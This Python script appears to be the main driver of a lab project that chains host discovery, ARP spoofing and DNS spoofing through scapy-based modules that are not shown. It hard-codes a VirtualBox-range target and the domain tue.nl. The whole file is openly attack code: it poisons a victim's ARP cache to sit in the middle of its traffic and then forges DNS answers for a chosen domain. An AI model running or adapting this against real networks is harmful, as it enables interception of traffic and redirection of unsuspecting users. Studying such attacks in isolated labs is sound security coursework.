from src import arp_spoof as arp
from src import dns_spoof as dns
from src import discover
from scapy.arch import get_if_list

hosts = dict()

if __name__ == '__main__':
    for interface in get_if_list():
        hosts[interface] = dict()
        disc = discover.Discover(hosts, interface)
        disc.start()
        disc.active()

    arp_spoofing = arp.ARPSpoofing(
        interface="enp0s3",
        target_mac="08:00:27:b7:c4:af",
        target_ip="192.168.56.101",
        spoofed_ips=["192.168.56.102"],
        delay=3
    )
    input("Press [enter] to start ARP spoofing")
    arp_spoofing.start()
    input("Press [enter] to start DNS spoofing")
    dns_spoofing = dns.DNSSpoofing(
        interface="enp0s3",
        domain_names=["tue.nl"],
        victims=[],
        redirect_ip=""
    )
    dns_spoofing.start()
    input("Press [enter] to stop DNS spoofing")
    dns_spoofing.stop()
    input("Press [enter] to stop ARP spoofing")
    arp_spoofing.stop()